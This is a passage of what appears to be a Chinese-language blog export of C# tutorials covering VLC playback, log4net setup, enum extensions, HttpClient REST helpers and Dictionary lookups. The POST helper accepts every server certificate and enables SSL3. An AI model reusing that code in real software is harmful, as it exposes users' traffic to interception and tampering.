class="line">&#123;</span><br><span class="line">	public <span class="function"><span class="title">UploadFile</span></span>()</span><br><span class="line">	&#123;</span><br><span class="line">		ContentType = <span class="string">&quot;multipart/form-data&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	public string Name &#123; get; <span class="built_in">set</span>; &#125;</span><br><span class="line">	public string Filename &#123; get; <span class="built_in">set</span>; &#125;</span><br><span class="line">	public string ContentType &#123; get; <span class="built_in">set</span>; &#125;</span><br><span class="line">	public Stream Stream &#123; get; <span class="built_in">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>RestFul Api</tag>
        <tag>POST</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用Vlc64位元播放器By Vlc.DotNet</title>
    <url>/posts/5b0c4c33/</url>
    <content><![CDATA[<h3 id="C-使用Vlc64位元播放器By-Vlc-DotNet"><a href="#C-使用Vlc64位元播放器By-Vlc-DotNet" class="headerlink" title="C#使用Vlc64位元播放器By Vlc.DotNet"></a>C#使用Vlc64位元播放器By Vlc.DotNet</h3><span id="more"></span>
<p>Vlc.DotNet is a .net library that hosts the audio&#x2F;video capabilities of the VLC libraries. In other words, it’s a .net wrapper around libvlc.</p>
<p>Step1.先安裝vlc-3.0.8-win64.exe<br>Step2.Nuget安裝Vlc.DotNet<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/NugetVlcDotNet.png" width="100%" /><br>Step3.工具箱-&gt;COM元件-&gt;VlcControl<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/addVlcDotNetForms.png" width="100%" /><br>Step4.加入控制項，及加入以下範例程式:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private void vlcControl1_VlcLibDirectoryNeeded(object sender, Vlc.DotNet.Forms.VlcLibDirectoryNeededEventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">	e.VlcLibDirectory = new DirectoryInfo(@<span class="string">&quot;C:\Program Files\VideoLAN\VLC\&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">vlcControl1.Play(new Uri(&quot;</span>rtsp://184.72.239.149/vod/mp4:BigBuckBunny_115k.mov<span class="string">&quot;));</span></span><br></pre></td></tr></table></figure>

<p>References:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1plQm9ibzUvVmxjLkRvdE5ldA==">https://github.com/ZeBobo5/Vlc.DotNet<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Vlc64bit</tag>
        <tag>Vlc.DotNet</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用Vlc32位元播放器</title>
    <url>/posts/a93204fd/</url>
    <content><![CDATA[<h3 id="C-使用Vlc32位元播放器"><a href="#C-使用Vlc32位元播放器" class="headerlink" title="C#使用Vlc32位元播放器"></a>C#使用Vlc32位元播放器</h3><span id="more"></span>
<p>VLC media player主要用來播放串流的播放器，可用於rtsp、rtmp串流協定。</p>
<p>Step1.先安裝vlc-3.0.6-win32.exe<br>Step2.加入參考，選擇VideoLAN VLC ActiveX Plugin<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/COM類型程式庫.png" width="100%" /><br>Step3.工具箱-&gt;COM元件-&gt;VLC ActiveX Plugin and IE Web Plugin<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/工具箱COM元件.png" width="100%" /><br>Step4.加入控制項，在程式建構子加入以下範例程式:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">axVLCPlugin21.playlist.add(<span class="string">&quot;rtsp://184.72.239.149/vod/mp4:BigBuckBunny_115k.mov&quot;</span>);</span><br><span class="line">axVLCPlugin21.AutoLoop = <span class="literal">true</span>;</span><br><span class="line">axVLCPlugin21.AutoPlay = <span class="literal">true</span>;</span><br><span class="line">axVLCPlugin21.audio.mute = <span class="literal">true</span>;</span><br><span class="line">axVLCPlugin21.playlist.play();</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Vlc32bit</tag>
      </tags>
  </entry>
  <entry>
    <title>C#Log4net設定</title>
    <url>/posts/46ed40f7/</url>
    <content><![CDATA[<h3 id="C-Log4net設定"><a href="#C-Log4net設定" class="headerlink" title="C#Log4net設定"></a>C#Log4net設定</h3><span id="more"></span>
<p>這篇介紹在C#上安裝Log4net以及如何設定及使用功能</p>
<h3 id="對專案右鍵-gt-管理NuGet套件-gt-安裝log4net"><a href="#對專案右鍵-gt-管理NuGet套件-gt-安裝log4net" class="headerlink" title="對專案右鍵-&gt;管理NuGet套件-&gt;安裝log4net"></a>對專案右鍵-&gt;管理NuGet套件-&gt;安裝log4net</h3><p>log4net.config 如下<br>ERROR和FATAL會多印出程式行號</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;log4net&gt;</span><br><span class="line">    &lt;root&gt;</span><br><span class="line">      &lt;level value=<span class="string">&quot;DEBUG&quot;</span> /&gt;</span><br><span class="line">      &lt;appender-ref ref=<span class="string">&quot;DebugRollingFileAppender&quot;</span>/&gt;</span><br><span class="line">      &lt;appender-ref ref=<span class="string">&quot;InfoRollingFileAppender&quot;</span>/&gt;</span><br><span class="line">      &lt;appender-ref ref=<span class="string">&quot;WarnRollingFileAppender&quot;</span>/&gt;</span><br><span class="line">      &lt;appender-ref ref=<span class="string">&quot;ErrorRollingFileAppender&quot;</span>/&gt;</span><br><span class="line">      &lt;appender-ref ref=<span class="string">&quot;FatalRollingFileAppender&quot;</span>/&gt;</span><br><span class="line">    &lt;/root&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;DebugRollingFileAppender&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;log4net.Appender.RollingFileAppender&quot;</span> level=<span class="string">&quot;DEBUG&quot;</span>&gt;</span><br><span class="line">      &lt;file <span class="built_in">type</span>=<span class="string">&quot;log4net.Util.PatternString&quot;</span> value=<span class="string">&quot;C:\NetLog\.log&quot;</span>/&gt;</span><br><span class="line">      &lt;preserveLogFileNameExtension value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;staticLogFileName value=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">      &lt;param name=<span class="string">&quot;AppendToFile&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;rollingStyle value=<span class="string">&quot;Composite&quot;</span>/&gt;</span><br><span class="line">      &lt;datePattern value=<span class="string">&quot;yyyyMMdd-&#x27;DEBUG&#x27;&quot;</span>/&gt;</span><br><span class="line">      &lt;encoding value=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span><br><span class="line">      &lt;maxSizeRollBackups value=<span class="string">&quot;30&quot;</span> /&gt;</span><br><span class="line">      &lt;maximumFileSize value=<span class="string">&quot;100MB&quot;</span>/&gt;</span><br><span class="line">      &lt;countDirection value=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">      &lt;layout <span class="built_in">type</span>=<span class="string">&quot;log4net.Layout.PatternLayout&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;ConversionPattern&quot;</span> value=<span class="string">&quot;%date %-5level [%method] - %message%newline&quot;</span>/&gt;</span><br><span class="line">      &lt;/layout&gt;</span><br><span class="line">      &lt;filter <span class="built_in">type</span>=<span class="string">&quot;log4net.Filter.LevelRangeFilter&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMin&quot;</span> value=<span class="string">&quot;DEBUG&quot;</span> /&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMax&quot;</span> value=<span class="string">&quot;DEBUG&quot;</span> /&gt;</span><br><span class="line">      &lt;/filter&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;InfoRollingFileAppender&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;log4net.Appender.RollingFileAppender&quot;</span> level=<span class="string">&quot;INFO&quot;</span>&gt;</span><br><span class="line">      &lt;file <span class="built_in">type</span>=<span class="string">&quot;log4net.Util.PatternString&quot;</span> value=<span class="string">&quot;C:\NetLog\.log&quot;</span>/&gt;</span><br><span class="line">      &lt;preserveLogFileNameExtension value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;staticLogFileName value=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">      &lt;param name=<span class="string">&quot;AppendToFile&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;rollingStyle value=<span class="string">&quot;Composite&quot;</span>/&gt;</span><br><span class="line">      &lt;datePattern value=<span class="string">&quot;yyyyMMdd-&#x27;INFO&#x27;&quot;</span>/&gt;</span><br><span class="line">      &lt;encoding value=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span><br><span class="line">      &lt;maxSizeRollBackups value=<span class="string">&quot;30&quot;</span> /&gt;</span><br><span class="line">      &lt;maximumFileSize value=<span class="string">&quot;100MB&quot;</span>/&gt;</span><br><span class="line">      &lt;countDirection value=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">      &lt;layout <span class="built_in">type</span>=<span class="string">&quot;log4net.Layout.PatternLayout&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;ConversionPattern&quot;</span> value=<span class="string">&quot;%date %-5level [%method] - %message%newline&quot;</span>/&gt;</span><br><span class="line">      &lt;/layout&gt;</span><br><span class="line">      &lt;filter <span class="built_in">type</span>=<span class="string">&quot;log4net.Filter.LevelRangeFilter&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMin&quot;</span> value=<span class="string">&quot;INFO&quot;</span> /&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMax&quot;</span> value=<span class="string">&quot;INFO&quot;</span> /&gt;</span><br><span class="line">      &lt;/filter&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;WarnRollingFileAppender&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;log4net.Appender.RollingFileAppender&quot;</span> level=<span class="string">&quot;WARN&quot;</span>&gt;</span><br><span class="line">      &lt;file <span class="built_in">type</span>=<span class="string">&quot;log4net.Util.PatternString&quot;</span> value=<span class="string">&quot;C:\NetLog\.log&quot;</span>/&gt;</span><br><span class="line">      &lt;preserveLogFileNameExtension value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;staticLogFileName value=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">      &lt;param name=<span class="string">&quot;AppendToFile&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;rollingStyle value=<span class="string">&quot;Composite&quot;</span>/&gt;</span><br><span class="line">      &lt;datePattern value=<span class="string">&quot;yyyyMMdd-&#x27;WARN&#x27;&quot;</span>/&gt;</span><br><span class="line">      &lt;encoding value=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span><br><span class="line">      &lt;maxSizeRollBackups value=<span class="string">&quot;30&quot;</span> /&gt;</span><br><span class="line">      &lt;maximumFileSize value=<span class="string">&quot;100MB&quot;</span>/&gt;</span><br><span class="line">      &lt;countDirection value=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">      &lt;layout <span class="built_in">type</span>=<span class="string">&quot;log4net.Layout.PatternLayout&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;ConversionPattern&quot;</span> value=<span class="string">&quot;%date %-5level [%method] - %message%newline&quot;</span>/&gt;</span><br><span class="line">      &lt;/layout&gt;</span><br><span class="line">      &lt;filter <span class="built_in">type</span>=<span class="string">&quot;log4net.Filter.LevelRangeFilter&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMin&quot;</span> value=<span class="string">&quot;WARN&quot;</span> /&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMax&quot;</span> value=<span class="string">&quot;WARN&quot;</span> /&gt;</span><br><span class="line">      &lt;/filter&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;ErrorRollingFileAppender&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;log4net.Appender.RollingFileAppender&quot;</span> level=<span class="string">&quot;ERROR&quot;</span>&gt;</span><br><span class="line">      &lt;file <span class="built_in">type</span>=<span class="string">&quot;log4net.Util.PatternString&quot;</span> value=<span class="string">&quot;C:\NetLog\.log&quot;</span>/&gt;</span><br><span class="line">      &lt;preserveLogFileNameExtension value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;staticLogFileName value=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">      &lt;param name=<span class="string">&quot;AppendToFile&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;rollingStyle value=<span class="string">&quot;Composite&quot;</span>/&gt;</span><br><span class="line">      &lt;datePattern value=<span class="string">&quot;yyyyMMdd-&#x27;ERROR&#x27;&quot;</span>/&gt;</span><br><span class="line">      &lt;encoding value=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span><br><span class="line">      &lt;maxSizeRollBackups value=<span class="string">&quot;30&quot;</span> /&gt;</span><br><span class="line">      &lt;maximumFileSize value=<span class="string">&quot;100MB&quot;</span>/&gt;</span><br><span class="line">      &lt;countDirection value=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">      &lt;layout <span class="built_in">type</span>=<span class="string">&quot;log4net.Layout.PatternLayout&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;ConversionPattern&quot;</span> value=<span class="string">&quot;%date %-5level [%method](%logger:%line) - %message%newline&quot;</span>/&gt;</span><br><span class="line">      &lt;/layout&gt;</span><br><span class="line">      &lt;filter <span class="built_in">type</span>=<span class="string">&quot;log4net.Filter.LevelRangeFilter&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMin&quot;</span> value=<span class="string">&quot;ERROR&quot;</span> /&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMax&quot;</span> value=<span class="string">&quot;ERROR&quot;</span> /&gt;</span><br><span class="line">      &lt;/filter&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;FatalRollingFileAppender&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;log4net.Appender.RollingFileAppender&quot;</span> level=<span class="string">&quot;FATAL&quot;</span>&gt;</span><br><span class="line">      &lt;file <span class="built_in">type</span>=<span class="string">&quot;log4net.Util.PatternString&quot;</span> value=<span class="string">&quot;C:\NetLog\.log&quot;</span>/&gt;</span><br><span class="line">      &lt;preserveLogFileNameExtension value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;staticLogFileName value=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">      &lt;param name=<span class="string">&quot;AppendToFile&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">      &lt;rollingStyle value=<span class="string">&quot;Composite&quot;</span>/&gt;</span><br><span class="line">      &lt;datePattern value=<span class="string">&quot;yyyyMMdd-&#x27;FATAL&#x27;&quot;</span>/&gt;</span><br><span class="line">      &lt;encoding value=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span><br><span class="line">      &lt;maxSizeRollBackups value=<span class="string">&quot;30&quot;</span> /&gt;</span><br><span class="line">      &lt;maximumFileSize value=<span class="string">&quot;100MB&quot;</span>/&gt;</span><br><span class="line">      &lt;countDirection value=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">      &lt;layout <span class="built_in">type</span>=<span class="string">&quot;log4net.Layout.PatternLayout&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;ConversionPattern&quot;</span> value=<span class="string">&quot;%date [%-5level] [%method](%logger:%line) - %message%newline&quot;</span>/&gt;</span><br><span class="line">      &lt;/layout&gt;</span><br><span class="line">      &lt;filter <span class="built_in">type</span>=<span class="string">&quot;log4net.Filter.LevelRangeFilter&quot;</span>&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMin&quot;</span> value=<span class="string">&quot;FATAL&quot;</span> /&gt;</span><br><span class="line">        &lt;param name=<span class="string">&quot;LevelMax&quot;</span> value=<span class="string">&quot;FATAL&quot;</span> /&gt;</span><br><span class="line">      &lt;/filter&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line">  &lt;/log4net&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h3 id="需要使用的-cs-需加入設定"><a href="#需要使用的-cs-需加入設定" class="headerlink" title="需要使用的.cs 需加入設定"></a>需要使用的.cs 需加入設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">XmlConfigurator.Configure(new FileInfo(<span class="string">&quot;./log4net.config&quot;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="程式行號功能需搭配-pdb"><a href="#程式行號功能需搭配-pdb" class="headerlink" title="程式行號功能需搭配.pdb"></a>程式行號功能需搭配.pdb</h3><p>工具-&gt;選項-偵錯-&gt;符號<br>符號檔(.pdb)位置勾選Microsoft符號伺服器<br>佈版需要將.exe執行檔和.pdb符號檔一起deploy<br>log才會顯示行號</p>
<h3 id="Log使用方法"><a href="#Log使用方法" class="headerlink" title="Log使用方法"></a>Log使用方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class LogUtil</span><br><span class="line">&#123;</span><br><span class="line">	public static <span class="built_in">readonly</span> log4net.ILog logger = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);</span><br><span class="line">&#125;</span><br><span class="line">LogUtil.logger.Info(<span class="string">&quot;&quot;</span>);</span><br><span class="line">LogUtil.logger.Debug(<span class="string">&quot;&quot;</span>);</span><br><span class="line">LogUtil.logger.Warn(<span class="string">&quot;&quot;</span>);</span><br><span class="line">LogUtil.logger.Error(<span class="string">&quot;&quot;</span>);</span><br><span class="line">LogUtil.logger.Fatal(<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Log4net</tag>
      </tags>
  </entry>
  <entry>
    <title>C# Enum Extensions Method</title>
    <url>/posts/9f330179/</url>
    <content><![CDATA[<h3 id="C-EnumExtensionsMethod"><a href="#C-EnumExtensionsMethod" class="headerlink" title="C#EnumExtensionsMethod"></a>C#EnumExtensionsMethod</h3><span id="more"></span>
<p>這篇介紹在C#上如果寫出Enum的Extensions方法。</p>
<h3 id="enum-amp-Extensions-example"><a href="#enum-amp-Extensions-example" class="headerlink" title="enum &amp; Extensions example"></a>enum &amp; Extensions example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">namespace Test</span><br><span class="line">&#123;</span><br><span class="line">    public enum CityInTaiwan</span><br><span class="line">    &#123;</span><br><span class="line">        Taipei = 0,</span><br><span class="line">		NewTaipei = 1,</span><br><span class="line">        Taoyuan = 2</span><br><span class="line">    &#125;</span><br><span class="line">    public static class Extensions</span><br><span class="line">    &#123;</span><br><span class="line">        public static int getPersonsCount(this CityInTaiwan cityInTaiwan)</span><br><span class="line">        &#123;</span><br><span class="line">            int personsCount = -1;</span><br><span class="line">            switch (cityInTaiwan)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> CityInTaiwan.Taipei:</span><br><span class="line">                    personsCount = 1000000;</span><br><span class="line">                    <span class="built_in">return</span> personsCount;</span><br><span class="line">				<span class="keyword">case</span> CityInTaiwan.NewTaipei:</span><br><span class="line">				    personsCount = 3000000;</span><br><span class="line">                    <span class="built_in">return</span> personsCount;</span><br><span class="line">                <span class="keyword">case</span> CityInTaiwan.Taoyuan:</span><br><span class="line">                    personsCount = 2000000;</span><br><span class="line">                    <span class="built_in">return</span> personsCount;</span><br><span class="line">                default:</span><br><span class="line">                    <span class="built_in">return</span> personsCount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="呼叫方法"><a href="#呼叫方法" class="headerlink" title="呼叫方法"></a>呼叫方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CityInTaiwan.Taipei.getPersonsCount(); 		//Output:1000000</span><br><span class="line">CityInTaiwan.NewTaipei.getPersonsCount(); 	//Output:3000000</span><br><span class="line">CityInTaiwan.Taoyuan.getPersonsCount(); 	//Output:2000000</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Enum</tag>
        <tag>Extensions</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用HttpClient</title>
    <url>/posts/994c3a70/</url>
    <content><![CDATA[<h3 id="C-使用HttpClient"><a href="#C-使用HttpClient" class="headerlink" title="C#使用HttpClient"></a>C#使用HttpClient</h3><span id="more"></span>
<p>這篇介紹在C#上使用HttpClient</p>
<h3 id="Restful-API-GET"><a href="#Restful-API-GET" class="headerlink" title="Restful API: GET"></a>Restful API: GET</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private static <span class="built_in">readonly</span> string DefaultMediaType = <span class="string">&quot;application/json&quot;</span>;</span><br><span class="line"></span><br><span class="line">public static byte[] GET(string url, NameValueCollection values, int timeOut)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (values != null)</span><br><span class="line">		&#123;</span><br><span class="line">			url = url + <span class="string">&quot;?&quot;</span> + ToQueryString(values);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		byte[] result = null;</span><br><span class="line">		using (var client = new HttpClient())</span><br><span class="line">		&#123;</span><br><span class="line">			client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(DefaultMediaType));</span><br><span class="line">			client.Timeout = TimeSpan.FromMilliseconds(timeOut);</span><br><span class="line">			result = client.GetByteArrayAsync(url).Result;</span><br><span class="line">			string str = Encoding.Default.GetString(result);</span><br><span class="line">			Console.WriteLine(str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(<span class="string">&quot;Get failed:&quot;</span> + url);</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">private static string ToQueryString(NameValueCollection col)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> string.Join(<span class="string">&quot;&amp;&quot;</span>, col.AllKeys.Select(key =&gt; string.Format(<span class="string">&quot;&#123;0&#125;=&#123;1&#125;&quot;</span>, HttpUtility.UrlEncode(key), HttpUtility.UrlEncode(col[key]))));</span><br><span class="line">&#125;</span><br><span class="line">private static IDictionary&lt;string, string&gt; ToDictionary(this NameValueCollection <span class="built_in">source</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> source.AllKeys.ToDictionary(k =&gt; k, k =&gt; <span class="built_in">source</span>[k]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Restful-API-POST"><a href="#Restful-API-POST" class="headerlink" title="Restful API: POST"></a>Restful API: POST</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private static <span class="built_in">readonly</span> string DefaultMediaType = <span class="string">&quot;application/json&quot;</span>;</span><br><span class="line"></span><br><span class="line">public static string POST(string url, NameValueCollection values, int timeOut)</span><br><span class="line">&#123;</span><br><span class="line">	string result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		using (var client = new HttpClient())</span><br><span class="line">		&#123;</span><br><span class="line">			client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(DefaultMediaType));</span><br><span class="line">			client.Timeout = TimeSpan.FromMilliseconds(timeOut);</span><br><span class="line">			HttpContent contentPost = null;</span><br><span class="line">			<span class="keyword">if</span> (values != null)</span><br><span class="line">			&#123;</span><br><span class="line">				var json = JsonConvert.SerializeObject(values.ToDictionary());</span><br><span class="line">				contentPost = new StringContent(json, Encoding.UTF8, DefaultMediaType);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ServicePointManager.ServerCertificateValidationCallback = delegate &#123; <span class="built_in">return</span> <span class="literal">true</span>; &#125;;</span><br><span class="line">			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;</span><br><span class="line"></span><br><span class="line">			HttpResponseMessage response = client.PostAsync(url, contentPost).GetAwaiter().GetResult();</span><br><span class="line">			result = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	catch(Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(<span class="string">&quot;Post failed:&quot;</span> + url);</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static IDictionary&lt;string, string&gt; ToDictionary(this NameValueCollection <span class="built_in">source</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> source.AllKeys.ToDictionary(k =&gt; k, k =&gt; <span class="built_in">source</span>[k]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>HttpClient</tag>
        <tag>RestfulApi</tag>
      </tags>
  </entry>
  <entry>
    <title>CSharp使用 Dictionary GetValueOrGetKey</title>
    <url>/posts/3082cf3c/</url>
    <content><![CDATA[<h3 id="CSharp使用Dictionary-GetValueOrGetKey"><a href="#CSharp使用Dictionary-GetValueOrGetKey" class="headerlink" title="CSharp使用Dictionary_GetValueOrGetKey"></a>CSharp使用Dictionary_GetValueOrGetKey</h3><span id="more"></span>

<p>Dictionary&lt;string, string&gt; map &#x3D; new Dictionary&lt;string, string&gt;();<br>map.Add(“1”, “1”);<br>map.Add(“2”, “2”);<br>map.Add(“3”, “2”);</p>
<h3 id="1-foreach-KeyValuePair-traversing"><a href="#1-foreach-KeyValuePair-traversing" class="headerlink" title="1.foreach KeyValuePair traversing"></a>1.foreach KeyValuePair traversing</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">foreach (KeyValuePair&lt;string, string&gt; e <span class="keyword">in</span> map)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (e.Value.Equals(<span class="string">&quot;2&quot;</span>))</span><br><span class="line">	&#123; </span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-foreach-map-Keys"><a href="#2-foreach-map-Keys" class="headerlink" title="2.foreach map.Keys"></a>2.foreach map.Keys</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">foreach (string key <span class="keyword">in</span> map.Keys)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (map[key].Equals(<span class="string">&quot;2&quot;</span>))</span><br><span class="line">	&#123; </span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-Linq"><a href="#3-Linq" class="headerlink" title="3.Linq"></a>3.Linq</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//get all keys</span><br><span class="line">var keys = map.Where(x =&gt; x.Value == <span class="string">&quot;2&quot;</span>).Select(y =&gt; y.Key);</span><br></pre></td></tr></table></figure>

<h3 id="4-Get-first-key"><a href="#4-Get-first-key" class="headerlink" title="4.Get first key"></a>4.Get first key</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">var firstKey = map.FirstOrDefault(x =&gt; x.Value == <span class="string">&quot;2&quot;</span>).Key;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Dictionary</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用ffmpeg產生Mp4檔案</title>
    <url>/posts/eed3dc0a/</url>
    <content><![CDATA[<h3 id="C-使用ffmpeg產生Mp4檔案"><a href="#C-使用ffmpeg產生Mp4檔案" class="headerlink" title="C#使用ffmpeg產生Mp4檔案"></a>C#使用ffmpeg產生Mp4檔案</h3><span id="more"></span>
<p>ffmpeg是專門處理影音串流協定的程式，可以用來處理Rtsp協定或Rtmp協定。<br>這篇文章介紹如何在C#執行外部的ffmpeg.exe帶參數對串流協定來產生MP4檔案。</p>
